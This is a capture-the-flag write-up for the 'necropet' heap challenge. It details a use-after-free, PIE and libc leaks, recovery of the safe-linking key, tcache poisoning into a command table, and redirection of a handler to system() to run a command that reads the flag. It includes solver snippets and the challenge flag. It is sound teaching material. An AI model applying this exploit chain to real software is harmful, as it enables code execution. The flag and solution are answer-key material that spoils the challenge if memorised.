# necropet

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Points | 100 |
| Author | EH |
| Connection | `nc chal.thjcc.org 1024` |
| Handout | [`artifacts/necropet.zip`](artifacts/necropet.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}` |

## Overview

`necropet` is a heap exploitation challenge built around an intake ledger for
deceased pets. The program lets us allocate records, select one at the front
desk, edit it, display it, and release it.

The central mistake is an ownership mismatch. Selecting a record copies its
pointer and metadata into a global `desk` object. Releasing that record clears
the kennel slot, but it does not invalidate the desk. Both `show` and `revise`
continue to trust the stale desk pointer as long as the slot's monotonically
increasing case identifier still matches.

This produces two strong use-after-free primitives:

- `show` discloses the complete contents of a freed allocation;
- `revise` writes attacker-controlled bytes to the start of that allocation.

The exploit uses them to leak PIE and libc, recover glibc safe-linking state,
poison a tcache list, and make `malloc` return a pointer into the binary's
writable command table. One command entry is then changed to call
`system()`, which reads the flag through the service's configured flag path.

## 1. Inspecting the Handout

The supplied archive contains the challenge binary, its exact Ubuntu 24.04
loader and libc, a Dockerfile, and a local placeholder flag:

```text
forplayers/
|-- Dockerfile
|-- ld-linux-x86-64.so.2
|-- libc.so.6
|-- necropet
`-- thisisratratratrat_puipui.txt
```

The original archive has SHA-256:

```text
52ea92b56fed15d872abde20adad695727297e7ad59983f43f1d81076038727f
```

Basic triage identifies a non-stripped x86-64 PIE with all common memory
protections enabled:

| Mitigation | State |
| --- | --- |
| PIE | Enabled |
| NX | Enabled |
| Stack canary | Enabled |
| RELRO | Full |
| Symbols | Present |

The supplied libc is Ubuntu glibc 2.39, build ID:

```text
328820b908de8ea1ef79afa8995e302e819163d7
```

The Dockerfile also reveals how the flag is exposed to the process:

```dockerfile
ENV NECROPET_FLAG_PATH=./thisisratratratrat_puipui.txt
```

The service starts the program with the bundled loader and libc, so offsets
derived from those files are valid remotely.

## 2. Reconstructing the Interface

The program accepts textual commands rather than a numbered menu:

```text
admit <slot> <kind> <note_cap> <note_len>
select <slot>
revise <len>
release <slot>
show
visit
cook
login
help
```

The `admit` handler accepts kennel indices from 0 through 15, species kinds
from 0 through 6, and note capacities from `0x20` through `0x4f0`. It allocates
`note_cap + 0x28` bytes and builds this record:

```c
typedef struct Pet {
    char name[0x18];
    const char *species;
    size_t note_cap;
    unsigned char note[];
} Pet;
```

Each kennel slot stores the allocation together with its total size and a case
identifier:

```c
typedef struct Kennel {
    Pet *pet;
    size_t allocation_size;
    uint32_t case_id;
    uint32_t padding;
} Kennel;
```

The relevant global addresses, relative to the PIE base, are:

| Object | Offset |
| --- | ---: |
| Command table | `0x5020` |
| Desk snapshot | `0x5120` |
| Kennel array | `0x5140` |

The command table consists of nine entries, each `0x18` bytes long:

```c
typedef struct Command {
    char name[0x10];
    void (*handler)(char *arguments);
} Command;
```

After locating a command name, the main loop passes the remainder of the input
line directly to its handler. This calling convention becomes useful once a
handler pointer is redirected to `system`.

## 3. Finding the Use-After-Free

`select` copies four values from a kennel into the global desk:

```c
desk.pet = kennels[slot].pet;
desk.allocation_size = kennels[slot].allocation_size;
desk.slot = slot;
desk.case_id = kennels[slot].case_id;
```

`release` frees the allocation and clears the live kennel pointer and size:

```c
free(kennels[slot].pet);
kennels[slot].pet = NULL;
kennels[slot].allocation_size = 0;
```

It never clears `desk.pet`.

The checks in `show` and `revise` only ensure that a desk exists, the saved
slot is in range, and the saved case identifier still matches the kennel's
case identifier. Releasing a slot does not change that identifier, and neither
handler checks whether the current kennel pointer is null.

As a result, this sequence leaves a valid dangling desk pointer:

```text
admit 0 0 32 0
select 0
release 0
show
```

`show` hex-encodes `desk.allocation_size` bytes from the stale allocation.
`revise` performs an exact-length read directly into `desk.pet`, allowing the
freed chunk metadata to be overwritten.

## 4. Leaking the PIE Base

Before freeing a record, its `species` field contains a pointer into the
binary's read-only data. Species kind zero is the string `"cat"`, located at
PIE offset `0x31ec`.

The solver first creates a maximum-sized record and selects it:

```python
admit(io, 0, 0, 0x4F0)
admit(io, 1, 0, 0x20)  # prevents top-chunk consolidation
select(io, 0)
live = show(io)
```

The species pointer is at record offset `0x18`, so the PIE base is:

```python
pie = u64(live[0x18:0x20]) - 0x31EC
```

Using an in-object pointer is deterministic and avoids relying on accidental
stack or heap contents.

## 5. Leaking libc From the Unsorted Bin

The large record requests `0x4f0 + 0x28 = 0x518` bytes. Glibc rounds this to a
`0x520` chunk, which is larger than the default tcache maximum. The small guard
record allocated immediately afterward prevents the large record from merging
with the top chunk when it is freed.

Releasing slot zero therefore places the large chunk in the unsorted bin:

```python
release(io, 0)
stale_large = show(io)
arena_pointer = u64(stale_large[:8])
```

The allocator replaces the first two words of the freed user area with
unsorted-bin `fd` and `bk` pointers. Analysis of the bundled glibc gives:

```text
main_arena                  = libc + 0x203ac0
unsorted-bin list pointer   = libc + 0x203b20
system                      = libc + 0x058750
```

The base calculations are therefore:

```python
libc = arena_pointer - 0x203B20
system = libc + 0x58750
```

Both recovered bases are checked implicitly by their page alignment and by
the successful final control-flow transfer.

## 6. Recovering Safe-Linking State

The target command table is writable, but Full RELRO prevents a simpler GOT
overwrite. The stale write primitive instead lets us poison a tcache list.

A note capacity of `0x38` creates a `0x60`-byte allocation request and a
`0x70` glibc chunk. The exploit allocates two such records, A and C:

```python
admit(io, 2, 0, 0x38)  # A
admit(io, 3, 0, 0x38)  # C
```

Modern glibc protects a tcache forward pointer as:

```text
encoded_next = next ^ (current_chunk_address >> 12)
```

Freeing A into an empty tcache bin encodes a null next pointer. Its first word
therefore discloses exactly `A >> 12`:

```python
select(io, 2)
release(io, 2)
a_key = u64(show(io)[:8])
```

C was allocated immediately after A and has the same `0x70` chunk size.
Freeing it places C at the tcache head, with A as its encoded successor:

```python
select(io, 3)
release(io, 3)
encoded_a = u64(show(io)[:8])
```

Normally both chunks occupy the same memory page. The solver also handles the
rare page-boundary case by testing `a_key` and `a_key + 1` as the possible key
for C, reconstructing A, and validating both page numbers:

```python
for candidate in (a_key, a_key + 1):
    a_addr = encoded_a ^ candidate
    c_addr = a_addr + 0x70
    if a_addr >> 12 == a_key and c_addr >> 12 == candidate:
        c_key = candidate
```

This avoids assuming that two consecutive allocations must share a page.

## 7. Poisoning Tcache Into the Command Table

The desired fake tcache entry is the writable command table at `PIE + 0x5020`.
It is 16-byte aligned, satisfying glibc's tcache alignment check.

Because the desk still references freed chunk C, `revise` can replace C's
encoded forward pointer:

```python
target = pie + 0x5020
revise(io, p64(target ^ c_key))
```

The `0x70` tcache list now behaves as:

```text
C -> command_table
```

Two matching admissions consume those entries:

```python
admit(io, 4, 0, 0x38)          # returns C
admit(io, 5, 0, 0x38, payload) # returns command_table
```

The tcache count was two before these operations. The first allocation pops C
and makes the command table the list head; the second allocation returns that
address. Tcache does not consult a normal chunk header for the cached pointer.

## 8. Creating a `pwn -> system` Command

When the second poisoned allocation lands at `PIE + 0x5020`, `admit` clears
`0x60` bytes and initializes the fake `Pet`. Its controlled note begins at
offset `0x28`, or absolute PIE offset `0x5048`.

That location overlaps the command table as follows:

| Address | Command-table field | Controlled bytes |
| --- | --- | --- |
| `PIE + 0x5048` | `select` handler | 8 padding bytes |
| `PIE + 0x5050` | next command name | `"pwn\0"` padded to 16 bytes |
| `PIE + 0x5060` | next command handler | address of libc `system` |

The 32-byte payload is:

```python
payload = (
    b"\0" * 8
    + b"pwn\0".ljust(16, b"\0")
    + p64(system)
)
```

The next input line matches the newly created `pwn` command. The main loop
passes everything after the command name as the first argument to the handler,
which now points to `system`:

```python
io.sendline(b'pwn cat "$NECROPET_FLAG_PATH"')
```

The environment variable comes from the challenge Dockerfile, so this command
does not need to guess a deployment-specific absolute path.

## 9. Running the Exploit

The solver is dependency-free and uses only Python's standard library:

```bash
python3 solve.py
```

The target can be overridden when necessary:

```bash
HOST=chal.thjcc.org PORT=1024 python3 solve.py
```

A successful run prints the recovered bases followed by:

```text
THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}
```
## Flag

```text
THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}
```
